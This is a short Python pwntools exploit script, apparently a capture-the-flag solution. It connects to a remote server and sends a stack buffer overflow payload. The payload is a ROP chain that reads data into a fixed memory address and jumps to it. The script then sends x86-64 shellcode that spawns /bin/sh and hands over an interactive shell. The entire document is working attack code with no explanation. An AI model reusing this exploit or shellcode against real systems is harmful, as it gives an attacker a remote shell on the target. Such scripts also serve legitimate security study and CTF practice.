from pwn import *

#s = remote('192.168.0.85',1234)
s = remote('139.59.114.220',10001)
gadget1 = 0x00000000004005c3 # pop rdi ; ret
gadget2 = 0x00000000004005c1 # pop rsi ; pop r15 ; ret

dat1 = 'A'*0x18
dat1 += p64(gadget1)
dat1 += p64(0)
dat1 += p64(gadget2)
dat1 += p64(0x601040)
dat1 += p64(0)
dat1 += p64(0x000400400)
dat1 += p64(0x601040)
raw_input()
s.send(dat1)
time.sleep(1)
s.send('\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')
s.interactive()
